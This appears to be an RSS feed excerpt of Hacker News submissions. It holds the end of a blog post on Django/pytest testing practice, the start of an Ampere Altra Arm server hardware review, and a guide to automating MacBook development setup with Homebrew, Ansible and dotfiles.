Covering a few default cases, should be a nice way to test said function and save ourselves (and the QA) some time being stopped by runtime errors that would easily be prevented.</p>
<p>If however not all cases were covered and some bug gets reported, itâ€™s fine (in fact great!) because this means weâ€™re enhancing the testing suite with another case,
making our code even more resilient.</p>
<p>Along with this benefit, there lies another: Tests are a great (yet, not the only) documentation and onboarding tool, which
means that they should be clear, descriptive and be able to provide a high level overview of what the code should accomplish.</p>
<p>For example, here is an excerpt from a few tests I wrote for a Django view that launches deployment operations:</p>
<div><div><pre><code><span>def</span> <span>it_creates_and_runs_an_operation_given_a_commit_reference</span><span>(</span><span>mock_user</span><span>,</span> <span>create_operation_data</span><span>):</span>
    <span># ...
</span>    <span>assert</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span>
    <span>assert</span> <span>response</span><span>.</span><span>data</span><span>[</span><span>'id'</span><span>]</span>
    <span>assert</span> <span>response</span><span>.</span><span>data</span><span>[</span><span>'kind'</span><span>]</span> <span>==</span> <span>'deployment'</span>
    <span># ...
</span>    <span>assert</span> <span>operation</span><span>.</span><span>is_running</span>

<span>def</span> <span>it_creates_and_runs_an_operation_without_a_commit_reference</span><span>(...):</span>
    <span># ....
</span>    <span>assert</span> <span>operation</span><span>.</span><span>is_running</span>
    <span>assert</span> <span>mock_celery_task</span><span>.</span><span>call_count</span> <span>==</span> <span>1</span>
    <span>assert</span> <span>operation</span><span>.</span><span>reference</span> <span>==</span> <span>expected_commit_information</span><span>[</span><span>'reference'</span><span>]</span>

<span>def</span> <span>it_does_not_start_the_operation_when_another_is_queued_prior_to_it</span><span>(...):</span>
    <span># Create an operation that is queued prior to the one we're queueing
</span>    <span>prior</span> <span>=</span> <span>operation_factory</span><span>.</span><span>create</span><span>(...)</span>
    <span># ...
</span>    <span>assert</span> <span>response</span><span>.</span><span>status_code</span> <span>==</span> <span>201</span>
    <span># ...
</span>    <span>assert</span> <span>not</span> <span>operation</span><span>.</span><span>can_start</span><span>()</span>
    <span>assert</span> <span>not</span> <span>operation</span><span>.</span><span>is_running</span>
    <span>assert</span> <span>not</span> <span>mock_celery_task</span><span>.</span><span>call_count</span>
    <span>assert</span> <span>operation</span><span>.</span><span>is_queued</span>
</code></pre></div></div>
<p>We now have of tests, groupped together with descriptive names, that provide an outline
that an operation can be started with or without a given reference, and what the expected statuses for the model in the database
and the returned HTTP status code should be. When I revisit this example in the future, or whenever a new hire joins the project,
it will hopefully be obvious to them, what the expected behavior should be without having to read long documentation.
Also, it covers three of the most common cases in the system, related to the â€œoperationsâ€ feature.</p>
<h4 id="keeping-tests-fast--testing-the-right-things">Keeping tests fast &amp; testing the right things</h4>
<p>Assuming you are using a web framework like Django or Ruby on Rails and you need to test an ORM or an ActiveRecord model,
it doesnâ€™t make any sense to test the <code>.save</code> or <code>.get</code> methods, because theyâ€™re already tested for you by
the amazing people that build the framework of choice. However, testing a custom validator you have
added to your model is a requirement.</p>
<p>The scope of a test should be limited as well. Letâ€™s take the following real-world example where we use pytest (with some syntactic sugar)
to test a <a href="https://docs.celeryproject.org/en/stable/userguide/index.html">celery task</a> that starts a queued deployment operation.
The <code>create_container</code> function runs a Docker container, but testing this is a) out of the given scope and b) slow if we create the actual container.
The solution to this issue would be to <a href="https://en.wikipedia.org/wiki/Mock_object">mock</a> the <code>create_container</code> call within the current scope:</p>
<div><div><pre><code><span>@</span><span>pytest</span><span>.</span><span>mark</span><span>.</span><span>django_db</span>
<span>def</span> <span>describe_start_operation_task</span><span>():</span>
    <span>def</span> <span>it_runs_the_task</span><span>(</span><span>queued_deployment</span><span>,</span> <span>mock_container</span><span>):</span>
        <span>allow</span><span>(</span><span>tasks</span><span>).</span><span>create_container</span><span>.</span><span>and_return</span><span>(</span><span>mock_container</span><span>)</span>
        <span>assert</span> <span>not</span> <span>queued_deployment</span><span>.</span><span>task_id</span>
        <span>assert</span> <span>not</span> <span>queued_deployment</span><span>.</span><span>container_id</span>

        <span># run the task
</span>        <span>celery_task</span> <span>=</span> <span>tasks</span><span>.</span><span>start_operation</span><span>.</span><span>s</span><span>(</span><span>operation_id</span><span>=</span><span>queued_deployment</span><span>.</span><span>id</span><span>).</span><span>apply_async</span><span>()</span>

        <span># make sure the deployment fields were populated accordingly
</span>        <span>queued_deployment</span><span>.</span><span>refresh_from_db</span><span>()</span>
        <span>assert</span> <span>queued_deployment</span><span>.</span><span>task_id</span> <span>==</span> <span>celery_task</span><span>.</span><span>id</span>
        <span>assert</span> <span>queued_deployment</span><span>.</span><span>container_id</span> <span>==</span> <span>mock_container</span><span>.</span><span>id</span>
</code></pre></div></div>
<p><a href="https://twitter.com/sandimetz">Sandi Metz</a> and <a href="https://twitter.com/kytrinyx">Katrina Owen</a> in their
great book <a href="https://sandimetz.com/99bottles">99 Bottles of OOP</a>, clearly and constantly state that
the tests should run upon every line of code that gets changed and theyâ€™re right. In practice, this
means that you should be able to run all your test suite as fast as possible.</p>
<p>In our example, we managed to save quite some time by mocking the docker container creation, which
is handled internally by a well tested library. Other examples might include external network requests,
big files loaded, email sending etc.</p>
<p>You might also have noticed in my examples that there is a certain degree of duplication. This is fine.
The tests are not a place to practice <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">DRY</a>; they
should be explicit and detailed in order for the other person to be able to understand every tiny bit of the process,
but also, doing fancy things usually leads to errors and you do want your tests to be straight-forward and valid.</p>
<h4 id="meet-your-new-best-friends">Meet your new best friends</h4>
<p>In the examples provided above, I introduced a few concepts that you might not be familiar with so far,
but will become your new best friends when you dive deep into testing: Factories, Fakes, Fakes, Stubs and Mocks.
Hereâ€™s some basic guidelines that would help you decide what you need each time:</p>
<ul>
<li>If you want an object and with random data, register a factory.</li>
<li>If you need an object with specific, predictable data, go for a fixture.</li>
<li>If you need a simplified version of a method or a class, with limited functionality, fake it.</li>
<li>If you need a set of predefined data returned by a method, stub it.</li>
<li>If you just need to count the calls to a method, mock it.</li>
</ul>
<h4 id="how-having-a-proper-test-suite-improves-your-code">How having a proper test suite improves your code</h4>
<p>Writing code with testability in mind, eventually leads to cleaner code, simply because in order to keep the tests simple,
one has to write short-scoped code that is limited to specific things. Long methods that do several things
are as hard to test as to maintain so, having testability in mind, meaning that you <strong>have</strong> to test such pieces of code,
practically acts as an incentive to keep the code maintainable.</p>
<p>Finally, refactoring and cleanup tasks, are a lot safer when the code is covered by reliable tests that will
stop your deployment when something breaks, which makes such tasks a breeze for the developer.</p>
<h4 id="theres-no-strategy-thats-better-than-others">Thereâ€™s no strategy thatâ€™s better than others</h4>
<p>I am aware that picking a testing strategy and policy could be a difficult task, however I donâ€™t think that a team should stress about it, also it should be a choice
thatâ€™s adapted to the teamâ€™s modus operandi, so that they adapt easily to it and it doesnâ€™t seem like a huge shift from what they had been doing so far.</p>
<p>If the team wants to practice <a href="https://en.wikipedia.org/wiki/Behavior-driven_development">BDD</a> and thatâ€™s something that suits the project,
it should be OK. If the team doesnâ€™t feel OK about doing <a href="https://en.wikipedia.org/wiki/Test-driven_development">TDD</a> where they should write tests in advance,
that should be fine as well, because the purpose is to save the teamâ€™s time, not force strict policies.
I am aware that methodologies exist for a reason, but experience shows that as long as the team are not practicing
<a href="https://www.hanselman.com/blog/fear-driven-development-fdd">FDD</a>, it should be OK.</p>
<h4 id="conclusion">Conclusion</h4>
<p>No matter how experienced or good we are at what we do, we will make that mistake. In order to avoid that annoying RuntimeError that
will disrupt our userâ€™s delightful experience, we have to make sure that our code works well no matter what and luckily, we have the tools to do so.
Embrace testing, focus on covering as many scenarios as you can and feel comfortable deploying. Even on Fridayâ€¦</p>
<h4 id="further-reading">Further reading</h4>
<ul>
<li><a href="https://web.stanford.edu/class/archive/cs/cs107/cs107.1212/testing.html">Software Testing Strategies</a> - Written by Julie Zelenski, with modifications by Nick Troccoli</li>
<li><a href="https://martinfowler.com/bliki/TestDouble.html">TestDâ€¦</a></li></ul></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.falexandrou.com/2020/12/20/testing-your-code/">https://www.falexandrou.com/2020/12/20/testing-your-code/</a></em></p>]]>
            </description>
            <link>https://www.falexandrou.com/2020/12/20/testing-your-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504016</guid>
            <pubDate>Tue, 22 Dec 2020 07:55:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ampere Altra Wiwynn Mt. Jade Server Review the Most Significant Arm Server]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25503939">thread link</a>) | @rbanffy
<br/>
December 21, 2020 | https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled.jpg" data-caption="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled"><img width="696" height="465" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-696x465.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled-629x420.jpg 629w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-CPUs-and-Memory-Angled.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled" title="Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled"></a><figcaption>Wiwynn Mt Jade Ampere Altra CPUs And Memory Angled</figcaption></figure></div>
            <!-- content --><p>In our Ampere Altra powered Wiwynn Mt. Jade server review, we are going to see why we feel this is the most significant new server of 2020.&nbsp;Wiwynn is far from a household name but it should not be unfamiliar to STH readers. STH got an exclusive tour in Q4 2018 of the companyâ€™s headquarters. You can read about that in <a href="https://www.servethehome.com/where-cloud-servers-come-from-visiting-wiwynn-in-taipei/">Where Cloud Servers Come From Visiting Wiwynn in Taipei</a>. Although Wiwynn may not be called out in press releases such as the&nbsp;<a href="https://www.servethehome.com/idc-3q20-server-tracker-dell-and-hpe-with-big-share-gain-lenovo-inspur-huawei/">IDC 3Q20 Server Tracker</a> it counts large cloud providers such as Facebook and Microsoft among its customers and has revenue of almost $6B USD per year the last time we checked. Compared to the traditional vendors IDC puts in their press releases, that would put them above Lenovo on hardware sales revenue, but with far fewer employees. Having the Wiwynn Mt. Jade server platform with the Arm-based Ampere Altra is a big deal. Wiwynnâ€™s business model is not to sell low numbers of servers to customers.<span id="more-49470"></span></p>
<p>In this review, we are going to look at the platform, and discuss some of the great features and nuances. We are also going to discuss performance, and then we are going to discuss why this is one of the most important platforms to be released in 2020. Even if you are not interested in Arm servers, this review is going to have some insights that go well beyond just the Altra processor and the server itself.</p>
<h2>Video Version</h2>
<p>As with many of our new pieces, we are going to have a video version of this article as well.</p>
<p><iframe title="Most Significant Server of 2020 Wiwynn Mt Jade Ampere Altra Arm Server" width="696" height="392" src="https://www.youtube.com/embed/jESiMLQVNf4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>This is a longer video, and has a lot of commentary around the server, and the market impact. As always, we suggest opening a new browser/ tab to watch it as it is a better experience than the embedded player. Also, likes and channel subscriptions are always welcome.</p>
<h2>Ampere Altra Wiwynn Mt. Jade Server Hardware Overview</h2>
<p>With our server reviews going into more detail, we now split our hardware overview into two primary sections. The first is that we look at the exterior of the server to get the basic bits that one servicing the server in a rack would most likely notice. We then get into the internal overview to look at some of the configurability and key features of the server.</p>
<h3>Ampere Altra Wiwynn Mt. Jade Server External Hardware Overview</h3>
<p>Taking a look at the Mt. Jade platform, we can see a fairly typical 2U server layout. This has a single USB port on the left, and a VGA port along with standard power button/ LEDs on the right. The main feature, by far, is storage. There are 24x 2.5â€³ bays and Wiwynn is leveraging the Ampere Altra platform to deliver one of the most forward-looking designs we have seen to date.</p>
<figure id="attachment_49484" aria-describedby="caption-attachment-49484"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-front-bays/" rel="attachment wp-att-49484"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays.jpg" alt="Wiwynn Mt Jade Ampere Altra Front Bays" width="800" height="462" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-400x231.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-696x402.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Front-Bays-727x420.jpg 727w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49484">Wiwynn Mt Jade Ampere Altra Front Bays</figcaption></figure>
<p>Wiwynn is connecting these 24x drive bays using 6x Amphenol PCIe Gen4 x16 cables. This is not a server designed for SAS/ SATA, instead, the company is leveraging the unique capabilities of the Ampere Altra platform to deliver something decidedly ahead of what many traditional vendors such as Dell, HPE, and Lenovo offer. Here the backplane does not have features such as a SAS expander. Instead, this is a NVMe backplane. One can see the backplanes are held in by thumbscrews, but the impact of Ampere Altra is felt immediately here, this is an all-NVMe design. This design provides Wiwynn the flexibility to swap to a SAS/SATA backplane setup if a customer wishes, but we really like this hardline stance to simplify on a next-generation architecture.</p>
<figure id="attachment_49479" aria-describedby="caption-attachment-49479"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-backplane/" rel="attachment wp-att-49479"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane.jpg" alt="Wiwynn Mt Jade Ampere Altra Backplane" width="800" height="534" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Backplane-629x420.jpg 629w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49479">Wiwynn Mt Jade Ampere Altra Backplane</figcaption></figure>
<p>The chassis itself has four of those drive bays (one cableâ€™s worth) that are optionally connected. Although the cable is connected via the backplane here, the other end can be used in a PCIe Gen4 x16 header that can instead provide PCIe connectivity to rear risers. Ampere Altra has many PCIe lanes, but there are limits. Still, Wiwynnâ€™s forward-looking design is moving beyond the limitations of PCB and has configurability on where PCIe lanes are directed. We will see more of this type of design in the PCIe Gen4 era but it will become increasingly commonplace as we move to PCIe Gen5 and beyond. Effectively, with Ampere Altra is providing Wiwynn with a platform that is already incorporating these design principles.</p>
<p>On the rear of the server, we see a fairly standard layout. The rear I/O consists of a VGA port, a management LAN port, a serial port, and two USB 3 ports. There are three blocks for I/O risers, two are full-height and one is low-profile. One can also see an OCP NIC 3.0 slot in the middle of the platform.</p>
<figure id="attachment_49490" aria-describedby="caption-attachment-49490"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-rear/" rel="attachment wp-att-49490"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear.jpg" alt="Wiwynn Mt Jade Ampere Altra Rear" width="800" height="479" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-400x240.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-696x417.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-Rear-701x420.jpg 701w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49490">Wiwynn Mt Jade Ampere Altra Rear</figcaption></figure>
<p>The 2kW power supplies seem a bit large for the relatively lower power consumption of the Ampere Arm server chips. The 80Plus Platinum units are likely larger than a normal server of this class simply as this is also a development platform. As a result, people tend to plug a multitude of devices into this type of server. That can include many high-power NVMe SSDs up front, or even accelerators in the rear. We tried the <a href="https://www.servethehome.com/nvidia-tesla-t4-ai-inferencing-gpu-review/">NVIDIA T4</a> and it worked in this platform.</p>
<figure id="attachment_49489" aria-describedby="caption-attachment-49489"><a href="https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/wiwynn-mt-jade-ampere-altra-psu/" rel="attachment wp-att-49489"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU.jpg" alt="Wiwynn Mt Jade Ampere Altra PSU" width="800" height="534" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-400x267.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-696x465.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/Wiwynn-Mt-Jade-Ampere-Altra-PSU-629x420.jpg 629w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-49489">Wiwynn Mt Jade Ampere Altra PSU</figcaption></figure>
<p>Part of the purpose of this piece is to show how similar the server is to a modern x86 server since that is a big question when organizations are looking to add Arm into their data centers.</p>
<p>Next, we are going to look at the internals of the server before proceeding with the remainder of our review.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/ampere-altra-wiwynn-mt-jade-server-review-the-most-significant-arm-server/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503939</guid>
            <pubDate>Tue, 22 Dec 2020 07:42:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Team Building for early-stage startups]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25503916">thread link</a>) | @madmax108
<br/>
December 21, 2020 | https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0 | <a href="https://web.archive.org/web/*/https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/Team-Building-for-early-stage-startups-bcf644db356b4ca58108909448ec2ab0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503916</guid>
            <pubDate>Tue, 22 Dec 2020 07:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Automatically Setup Your MacBook for Development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25503906">thread link</a>) | @dsteenman
<br/>
December 21, 2020 | https://dannys.cloud/automatically-setup-macbook-development | <a href="https://web.archive.org/web/*/https://dannys.cloud/automatically-setup-macbook-development">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>As a Cloud Engineer, automation has become a part of my daily life. Automatically deploying Infrastructure using Code has become a safe and fast way to provision servers in the Cloud. Initially, it takes more time to configure the infrastructure as code, but it's reusable and minimizes configuration errors by human mistakes.</p>
<p><strong>What if we could apply the same principle to our local development environment?</strong> This guide will show you how to automatically set up your Macbook or Linux machine using Ansible and dotfiles.</p>
<p><strong>Table of Contents</strong></p>
<ul>
<li><a href="#prerequisite">Prerequisite</a></li>
<li><a href="#homebrew">Homebrew</a></li>
<li><a href="#ansible">Ansible</a></li>
<li><a href="#playbook">Playbook</a></li>
<li><a href="#setup-your-preferred-packages">Setup your preferred packages</a></li>
<li><a href="#configure-dotfiles">Configure dotfiles</a></li>
<li><a href="#installation">Installation</a></li>
<li><a href="#installation-complete">Installation complete!</a></li>
</ul>
<h2 id="prerequisite">Prerequisite</h2>
<p>Ensure Apple's command-line tools are installed:</p>
<pre><code>xcode-select --install
</code></pre>
<h2 id="homebrew">Homebrew</h2>
<p>The first step is to download  <a target="_blank" href="https://brew.sh/">Homebrew</a>  for your Mac:</p>
<pre><code>/bin/bash -c <span>"<span>$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>"</span>
</code></pre>
<p>Homebrew allows you to easily install packages and applications on your machine without having to go to the download page of the vendor to install it from there. An added benefit is that you can easily update the packages using a simple command like:</p>
<pre><code>brew update &amp;&amp; brew upgrade
</code></pre>
<h2 id="ansible">Ansible</h2>
<p> <a target="_blank" href="https://www.ansible.com/overview/how-ansible-works">Ansible</a>  is a tool that automates provisioning, does configuration management, and is being used widely in the Cloud.</p>
<p>It uses no agents and no additional custom security infrastructure, so it's easy to deploy - and most importantly, it uses a very simple language (YAML, in the form of Ansible Playbooks) that allow you to describe your automation jobs in a way that approaches plain English.</p>
<p>So the next step is to install  <a target="_blank" href="https://www.ansible.com/">Ansible</a> using Homebrew:</p>
<pre><code>brew install python ansible
</code></pre>
<p>An important note when installing Python with Homebrew is that we need to change the PATH on our system for Python, otherwise MacOS will use the system default Python.</p>
<pre><code><span>export</span> PATH=<span>"/usr/local/opt/python/libexec/bin:<span>$PATH</span>"</span>
</code></pre>
<p>We want to avoid using the system default for  <a target="_blank" href="https://towardsdatascience.com/time-to-make-the-switch-9eb719d434de">many reasons</a>, but the most important one is that it still comes with Python2.7 (which is deprecated).</p>
<h2 id="playbook">Playbook</h2>
<p>Ansible is the orchestration tool and uses <a target="_blank" href="https://docs.ansible.com/ansible/latest/user_guide/playbooks.html">Playbooks</a> to record and execute Ansibleâ€™s configuration and deployment on the system.</p>
<p>Playbooks can be seen as an instruction manual at which the system is guided to execute the instructions that you have written. The benefit of using this is that you can apply the same set of instructions to different machines and expect the same outcome every time.</p>
<p>These Playbooks can be shared. So before we proceed with the installation, you need to clone or fork the <a target="_blank" href="https://github.com/geerlingguy/mac-dev-playbook">mac-dev-playbook repository</a>.</p>
<h2 id="setup-your-preferred-packages">Setup your preferred packages</h2>
<p>Every development environment is unique, so you can create a <code>config.yml</code> that contains a list of packages and configuration settings that you want to apply to your environment. As an example you can have a look at the <code>default.config.yml</code> in the root of the folder which contains a list of packages and configurations, as shown below:</p>
<pre><code><span>---</span>
<span>downloads:</span> <span>~/.ansible-downloads/</span>

<span>configure_dotfiles:</span> <span>true</span>
<span>configure_terminal:</span> <span>true</span>
<span>configure_osx:</span> <span>true</span>

<span>configure_sudoers:</span> <span>false</span>
<span>sudoers_custom_config:</span> <span>''</span>





<span>dotfiles_repo:</span> <span>https://github.com/geerlingguy/dotfiles.git</span>
<span>dotfiles_repo_accept_hostkey:</span> <span>true</span>
<span>dotfiles_repo_local_destination:</span> <span>~/Development/GitHub/dotfiles</span>
<span>dotfiles_files:</span>
  <span>-</span> <span>.zshrc</span>
  <span>-</span> <span>.gitignore</span>
  <span>-</span> <span>.inputrc</span>
  <span>-</span> <span>.osx</span>
  <span>-</span> <span>.vimrc</span>

<span>homebrew_installed_packages:</span>
  
  <span>-</span> <span>autoconf</span>
  <span>-</span> <span>bash-completion</span>
  <span>-</span> <span>doxygen</span>
  <span>-</span> <span>gettext</span>
  <span>-</span> <span>gifsicle</span>
  <span>-</span> <span>git</span>
  <span>-</span> <span>github/gh/gh</span>
  <span>-</span> <span>go</span>
  <span>-</span> <span>gpg</span>
  <span>-</span> <span>httpie</span>
  <span>-</span> <span>iperf</span>
  <span>-</span> <span>libevent</span>
  <span>-</span> <span>sqlite</span>
  <span>-</span> <span>mcrypt</span>
  <span>-</span> <span>nmap</span>
  <span>-</span> <span>node</span>
  <span>-</span> <span>nvm</span>
  <span>-</span> <span>php</span>
  <span>-</span> <span>ssh-copy-id</span>
  <span>-</span> <span>cowsay</span>
  <span>-</span> <span>readline</span>
  <span>-</span> <span>openssl</span>
  <span>-</span> <span>pv</span>
  <span>-</span> <span>wget</span>
  <span>-</span> <span>wrk</span>

<span>homebrew_taps:</span>
  <span>-</span> <span>homebrew/core</span>
  <span>-</span> <span>homebrew/cask</span>

<span>homebrew_cask_appdir:</span> <span>/Applications</span>
<span>homebrew_cask_apps:</span>
  <span>-</span> <span>chromedriver</span>
  <span>-</span> <span>docker</span>
  <span>-</span> <span>dropbox</span>
  <span>-</span> <span>firefox</span>
  <span>-</span> <span>google-chrome</span>
  <span>-</span> <span>handbrake</span>
  <span>-</span> <span>licecap</span>
  <span>-</span> <span>sequel-pro</span>
  <span>-</span> <span>slack</span>
  <span>-</span> <span>sublime-text</span>
  <span>-</span> <span>transmit</span>
  <span>-</span> <span>vagrant</span>


<span>mas_installed_apps:</span> []
<span>mas_email:</span> <span>""</span>
<span>mas_password:</span> <span>""</span>

<span>osx_script:</span> <span>"~/.osx --no-restart"</span>




<span>composer_packages:</span> []



<span>gem_packages:</span> []



<span>npm_packages:</span> []



<span>pip_packages:</span> []





<span>post_provision_tasks:</span> []
</code></pre>
<p>This playbook is pretty versatile and allows you to install Homebrew, Mac Application Store (mas) packages, composer, gem, npm, and pip packages.</p>
<h2 id="configure-dotfiles">Configure dotfiles</h2>
<p>Once you've created your own config file with your preferred packages, it's time to add your own Dotfiles repository to setup custom configurations for your software.</p>
<p><strong>So what are dotfiles?</strong> Dotfiles are text-based configuration files that store settings of almost every application, or tool that runs in your environment. In communities like Github, people share their application preferences so others can use them to set up their systems faster by restoring these "dotfile" configuration files. The biggest advantage is that you can backup your application preferences and make sure you're always using the same preferences, irrespective of the machine that you're using.</p>
<p>If you're new to dotfiles you can read more about it in this <a target="_blank" href="https://dotfiles.github.io/">helpful guide on dotfiles</a>. I'll also share a few links below which contain pre-configured dotfiles for your favorite tools:</p>
<ul>
<li><a target="_blank" href="https://github.com/mathiasbynens/dotfiles">Mathiasâ€™s dotfiles</a></li>
<li><a target="_blank" href="https://github.com/Bash-it/bash-it">Community bash framework</a></li>
<li><a target="_blank" href="https://github.com/alrra/dotfiles">Allra macOS / Ubuntu dotfiles</a></li>
<li><a target="_blank" href="https://github.com/geerlingguy/dotfiles">Geerlingguy's dotfiles</a></li>
</ul>
<p><strong>Note: dotfiles contain personal preferences, so it's good to review these files and apply changes where necessary before you copy them to your own repository</strong></p>
<p>Once you have your own repository filled with dotfiles, you can update the <code>dotfiles_repo</code> variable in the <code>config.yml</code> with your own dotfiles repository. Below I've shown an example of what it looks like when I set up my own dotfiles:</p>
<pre><code><span>configure_dotfiles:</span> <span>true</span>
<span>dotfiles_repo_accept_hostkey:</span> <span>false</span>
<span>dotfiles_repo_local_destination:</span> <span>~/Github/dotfiles</span>
<span>dotfiles_repo_version:</span> <span>master</span>
<span>dotfiles_repo:</span> <span>git@github.com:dsteenman/dotfiles.git</span>
<span>dotfiles_files:</span>
  <span>-</span> <span>.aliases.zsh</span>
  <span>-</span> <span>.aws</span>
  <span>-</span> <span>.eslintignore</span>
  <span>-</span> <span>.eslintrc</span>
  <span>-</span> <span>.fzf.zsh</span>
  <span>-</span> <span>.gitconfig</span>
  <span>-</span> <span>.gitconfig.user</span>
  <span>-</span> <span>.gitignore</span>
  <span>-</span> <span>.iterm2</span>
  <span>-</span> <span>.macos</span>
  <span>-</span> <span>.starship</span>
  <span>-</span> <span>.zprofile</span>
  <span>-</span> <span>.zsh_plugins.txt</span>
  <span>-</span> <span>.zshenv</span>
  <span>-</span> <span>.zshrc</span>
</code></pre>
<p>The parameter <code>dotfiles_repo_local_destination</code> is the location where ansible downloads your dotfiles repository. Remember that location, because that's where you'll manage changes in your dotfiles. Ansible automatically creates symlinks of the dotfiles that you enabled in the parameter <code>dotfiles_files</code> and link them to your home folder on your Mac or Ubuntu machine. The advantage of this construction is that when you make adjustments in your dotfiles over time, it will automatically update the repository. You only have to commit and push the changes to update it remotely.</p>
<h2 id="installation">Installation</h2>
<p>Once the requirements have been fulfilled, we can proceed with the actual installation and let Ansible perform it's magic!</p>
<p>In the root of the folder <code>mac-dev-playbook</code> repository that you forked or cloned run the command <code>ansible-galaxy install -r requirements.yml</code> to install the required ansible roles.</p>
<p>Now you can run the playbook and install your packages and dotfiles with the command <code>ansible-playbook main.yml -u [username] --ask-become-pass</code> (substitute <code>[username]</code> for your username). Enter your account password when prompted.</p>
<h2 id="installation-complete">Installation complete!</h2>
<p><strong>Your Macbook should be fully customized and ready for development!</strong> Having automated provisioning of your development machine is very useful if you use lots of different development tools, each with its own unique settings.</p>
